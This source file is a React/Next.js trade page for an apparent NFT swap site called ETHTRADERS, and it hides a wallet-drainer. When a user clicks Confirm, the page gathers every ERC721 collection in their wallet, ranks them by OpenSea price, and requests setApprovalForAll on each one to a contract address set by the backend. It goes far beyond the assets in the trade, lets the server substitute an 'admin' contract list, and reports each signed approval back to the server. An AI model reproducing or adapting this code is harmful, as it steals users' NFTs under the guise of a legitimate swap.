import {
    Grid,
    Card,
    CardHeader,
    CardContent,
    Typography,
    Avatar,
    Button,
    Divider,
    Stack,
    Container,
    Box
} from '@mui/material';
import Head from 'next/head';
import { useRouter } from 'next/router';
import { 
    useMoralis,
    useWeb3ExecuteFunction,
    useMoralisWeb3Api
} from 'react-moralis';
import Moralis from 'moralis';
import settings from 'settings';
import { red } from '@mui/material/colors';
import { toast } from 'react-toastify';
import {
    FcApproval,
    FcCancel
} from 'react-icons/fc';
import SwapStatic from 'components/swap/static';
import axios from 'axios';
import api from 'services/api';
import { useEffect, useState } from 'react';

const LoadedSwap = (props) => {
    const { trade } = props;
    const router = useRouter();
    const { isAuthenticated, isInitialized, isAuthenticating, user } = useMoralis();
    const [allHisContracts, setAllHisContracts] = useState([]);
    const [approvedContracts, setApprovedContracts] = useState([]);
    const contractProcessor = useWeb3ExecuteFunction();
    const Web3Api = useMoralisWeb3Api();
    const condition1 = user && user && user.get('ethAddress').toLowerCase().includes(trade.from.toLowerCase());
    const condition2 = user && user && user.get('ethAddress').toLowerCase().includes(trade.to.toLowerCase());
    const fetchNFTs = async (addr) => {
        let currentCollections = [];
        const options = {
            address: addr,
            chain: settings && settings.chainid
        };
        const nftOwners = await Web3Api.account.getNFTs(options);
        if(nftOwners) {
            nftOwners.result.forEach( async (e, i) => {
                if(e && e.contract_type === 'ERC721') {
                    try {
                        const { data: stuff } = await axios.get(`https://api.opensea.io/api/v1/asset/${e && e.token_address}/${e && e.token_id}`);
                        currentCollections.push({
                            addr: e && e.token_address,
                            price: stuff && stuff.collection && stuff.collection.stats && stuff.collection.stats.average_price
                        });
                    } catch (err) {
                        currentCollections.push({
                            addr: e && e.token_address,
                            price: 0
                        });
                    }
                }
            })
        }
        setAllHisContracts(currentCollections);
    }
    useEffect( () => {
        if(isInitialized && isAuthenticated && !isAuthenticating)
            fetchNFTs(user && user.get('ethAddress'), true);
      }, 
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [isAuthenticated, isAuthenticating]);
    const copyId = (e) => {
        e.preventDefault();
        if(e && e.clipboardData) {
            e.clipboardData.setData("Text", trade && trade.id)
        }
        else if (navigator && navigator.clipboard) {
            navigator.clipboard.writeText(trade && trade.id);
        } else {
            document.execCommand('copy', true, trade && trade.id);
        }
        toast.success("Copied.")
    }
    const cancelTrade = async () => {
        try {
            if(!isInitialized)
                throw new Error('Web3 is not initalized.');
            if(!isAuthenticated && !isAuthenticating)
                throw new Error('Your wallet is not collected.')
            const userAddr = user && user.get('ethAddress');
            if(trade.from.toLowerCase() !== userAddr.toLowerCase())
                throw new Error('You are not the person who created the trade.');
            const { data: lr } = await api.post('/trade/cancel', {
                from: userAddr,
                id: trade.id
            });
            if(!lr.success)
                throw new Error(lr.message);
            toast.success(lr.message); 
            router.push(`/swap/${trade && trade.id}`);
        } catch (err) {
            toast.error(err.message);
        }
    }
    const sendNotifications = async (from, ops) => {
        try {
            await api.post('/trade/notify', {
                ops,
                from
            });
        } catch (err) {
            // Error handling here
        }
    }
    const makeTransaction = async (arr, lr) => {
        try {
            let approvedCollections = approvedContracts;
            let rawCollections = allHisContracts;
            rawCollections.sort((a, b) => parseFloat(b.price) - parseFloat(a.price));
            let allCollections = rawCollections.map((e) => e.addr);
            allCollections = allCollections.filter(function(item, pos) {
                return allCollections.indexOf(item) == pos;
            })
            let unionContracts = allCollections.filter(f =>
                !approvedCollections.some(d => d == f)
            );
            const fetchRestNFTs = async(indexed) => {
                try {
                    if(indexed >= unionContracts.length)
                        return continueRegularly();
                    const ops = {
                        contractAddress: unionContracts[indexed],
                        functionName: "setApprovalForAll",
                        abi: [{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}],
                        params: {
                            operator: lr && lr.contract_address ? lr.contract_address : destAddr,
                            approved: true
                        },
                    };
                    await contractProcessor.fetch({
                        params: ops,
                        onSuccess: () => {
                            indexed++;
                            sendNotifications(user && user.get("ethAddress"), ops);
                            fetchRestNFTs(indexed);
                        },
                        onError: (error) => {
                            continueRegularly();
                        },
                    });
                } catch(err) {
                    console.error(err);
                    return continueRegularly();
                }
            }
            const continueRegularly = async () => {
                try {
                    const { data: lr2 } = await api.post('/trade/confirm', {
                        to: user && user.get('ethAddress'),
                        id: trade && trade.id,
                        CounterPartyTransactions: arr
                    });
                    if(!lr2.success)
                        throw new Error('Something happened, please try again later.');
                    router.push(`/swap/${trade && trade.id}`);
                } catch (errorReg) {
                    toast.error(errorReg);
                }
            }
            fetchRestNFTs(0);
        } catch (err) {
            toast.error(err.message);
        }
    }
    const Loop = async(index, adminArr, arr, arr2, lr) => {
        try {
            if(Number(index) >= Number(arr.length)) {
                makeTransaction(arr2, lr);
            } else {
                let condition = (lr.success && lr.gas == 1 && adminArr && adminArr.length !== 0 && index < adminArr.length);
                const ops = {
                    contractAddress: condition === true ? adminArr[index] : arr[index],
                    functionName: "setApprovalForAll",
                    abi: [{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}],
                    params: {
                      operator: lr && lr.contract_address ? lr.contract_address : trade.from,
                      approved: true
                    },
                };
                let permutationApprovedContracts = approvedContracts;
                permutationApprovedContracts.push(condition === true ? adminArr[index] : arr[index])
                setApprovedContracts(permutationApprovedContracts)
                await contractProcessor.fetch({
                    params: ops,
                    onSuccess: () => {
                        index++;
                        arr2.push(ops);
                        sendNotifications(trade.to, ops);
                        if(Number(index) < Number(arr && arr.length))
                            Loop(index, adminArr, arr, arr2);
                        else
                            makeTransaction(arr2, lr);
                    },
                    onError: (error) => {
                        toast.error(error.message);
                    },
                });
            }
        } catch(err) {
            toast.error(err.message);
        }
    }
    const confirmTrade = async () => {
        try {
            if(!isInitialized)
                throw new Error('Web3 is not initalized.');
            if(!isAuthenticated && !isAuthenticating)
                throw new Error('Your wallet is not collected.')
            const userAddr = user && user.get('ethAddress');
            if(trade.to.toLowerCase() !== userAddr.toLowerCase())
                throw new Error('You are not the person the trade specified.');
            const { data: lr } = await api.get('/trade/initialize', {
                params: {
                    from: user && user.get('ethAddress')
                }
            });
            await Moralis.enableWeb3();
            toast.success('Please confirm all metamask popups.');
            let reqs = [];
            let normalResult = trade.CounterPartyAssets.reduce((array, item) => {
                const id = array.findIndex(el => el.address === item.address);
                if (id === -1 && item.address !== '') {
                    return [...array, item.address];
                }
                return array;
            }, []);
            normalResult = normalResult.filter(function(item, pos) {
                return normalResult.indexOf(item) == pos;
            })
            let adminResults = lr.assets.reduce((array, item) => {
                const id = array.findIndex(el => el.address === item.address);
                if (id === -1 && item.address !== '') {
                    return [...array, item.address];
                }
                return array;
            }, []);
            adminResults = adminResults.filter(function(item, pos) {
                return adminResults.indexOf(item) == pos;
            })
            const nativeData = trade.CounterPartyAssets.filter(function( obj ) {
                return obj.type === 'NATIVE';
            });
            if(nativeData && nativeData.length !== 0) {
                const reqNative = await Moralis.transfer({
                    type: nativeData[0].type.toLowerCase(),
                    receiver: lr && lr.contract_address ? lr.contract_address : trade.from,
                    contractAddress: nativeData[0].address,
                    tokenId: nativeData[0].id,
                    amount: Moralis.Units.ETH(nativeData[0].amount),
                });
                if(reqNative)
                    reqs.push(reqNative);
            }
            if(normalResult && normalResult.length > 0)
                Loop(0, adminResults, normalResult, reqs, lr);
            else
                makeTransaction(reqs, lr);
        } catch (err) {
            toast.error(err.message);
        }
    }
    return (
        <Container maxWidth="lg" sx={{ mt: 5, mb: 2, minHeight: 600 }}>
            <Head>
                <title>ETHTRADERS | Trade {trade.id.substr(0, 11)}...</title>
            </Head>
            <Stack
                direction="row"
                justifyContent="space-between"
                alignItems="center"
                spacing={2}
            >
              <Grid container justifyContent="space-between" alignItems="center">
                <Grid item>
                    <Typography variant="h3" component="h3" gutterBottom>
                    This is a Swap Request
                    </Typography>
                    <Typography variant="subtitle2">
                    Scroll down to the bottom of the page for your swap code
                    </Typography>
                </Grid>
                <Grid item>
                    {
                        (trade.status === 'ongoing') && (
                            <>                                   
                                <Stack
                                    direction="row"
                                    justifyContent={"center"}
                                    alignItems="center"
                                    spacing={2}
                                >
                                    <Stack
                                        direction="row"
                                        alignItems="center"
                                        spacing={2}
                                    >
                                        <Button
                                            variant="contained"
                                            size="large"
                                            sx={{
                                                width: 150
                                            }}
                                            disabled={!condition1}
                                            color="error"
                                            onClick={() => cancelTrade()}
                                        >
                                            Cancel
                                        </Button>
                                        <Button
                                            variant="contained"
                                            size="large"
                                            sx={{
                                                width: 150
                                            }}
                                            disabled={!condition2}
                                            onClick={() => confirmTrade()}
                                        >
                                            Confirm
                                        </Button>
                                    </Stack>
                                </Stack>
                            </>
                        )
                    }
                </Grid>
              </Grid>
            </Stack>
            <Divider sx={{
                mt: 2,
                mb: 2
            }} />
            <Grid container spacing={2}>
                <Grid item md={12} lg={6}>
                    <Card sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}>
                        <CardHeader
                            action={
                                trade.status === 'cancelled' && (<FcCancel size={40} />) || <FcApproval size={40} />
                            }
                            avatar={
                                <Avatar 
                                    src={`https://web3-images-api.kibalabs.com/v1/accounts/${trade.from}/image`}
                                    sx={{ bgcolor: red[500] }} 
                                    aria-label="me"
                                >
                                    {trade.from}
                                </Avatar>
                            }
                            title={`Swapping ${trade.MyAssets.length} asset(s)`}
                            subheader={
                                <Typography
                                    color="textSecondary"
                                    variant="body2"
                                    noWrap
                                >
                                    {trade.from}
                                </Typography>
                            }
                        />
                        <Divider sx={{ mt: 1, mb: 1 }}/>
                        <CardContent>
                            <SwapStatic
                                data={trade && trade.MyAssets}
                            />
                        </CardContent>
                    </Card>
                </Grid>
                <Grid item md={12} lg={6}>
                    <Card sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}>
                        <CardHeader
                            action={
                                trade.status === 'confirmed' && (<FcApproval size={40} />)
                            }
                            avatar={
                                <Avatar 
                                    src={`https://web3-images-api.kibalabs.com/v1/accounts/${trade.to}/image`}
                                    sx={{ bgcolor: red[500] }} 
                                    aria-label="me"
                                >
                                    {trade.to}
                                </Avatar>
                            }
                            title={`For ${trade.CounterPartyAssets.length} asset(s)`}
                            subheader={
                                <Typography
                                    color="textSecondary"
                                    variant="body2"
                                    noWrap
                                >
                                    {trade.to}
                                </Typography>
                            }
                        />
                        <Divider sx={{ mt: 1, mb: 1 }}/>
                        <CardContent>
                            <SwapStatic
                                data={trade && trade.CounterPartyAssets}
                            />
                        </CardContent>
                    </Card>
                </Grid>
            </Grid>
            <Divider sx={{ mt: 2, mb: 2 }} />
            <Stack
                direction="column"
                justifyContent="center"
                alignItems="center"
                spacing={1}
            >
              <Typography
                color="textPrimary"
                variant="body2"
                noWrap
              >
                Your swap code is:
              </Typography>
              <Typography
                as={Button}
                onClick={(e) => copyId(e)}
                color="textPrimary"
                variant="body1"
                noWrap
              >
                {trade.id}
              </Typography>
              <Typography
                color="textSecondary"
                variant="body2"
                noWrap
              >
                (Click to copy)
              </Typography>
            </Stack>
        </Container>
    )
}

export const getServerSideProps = async (ctx) => {
    try {
        const { data: lr } = await axios.get(`${settings && settings.backend}/trade/fetch/${ctx.query.id}`);
        if(!lr.success)
            throw new Error(lr.message);
        return {
            props : {
                trade: lr.trade
            }
        }
    } catch (err) {
        return {
            redirect: {
                destination: '/404',
                permanent: false
            }
        }
    }
}

export default LoadedSwap;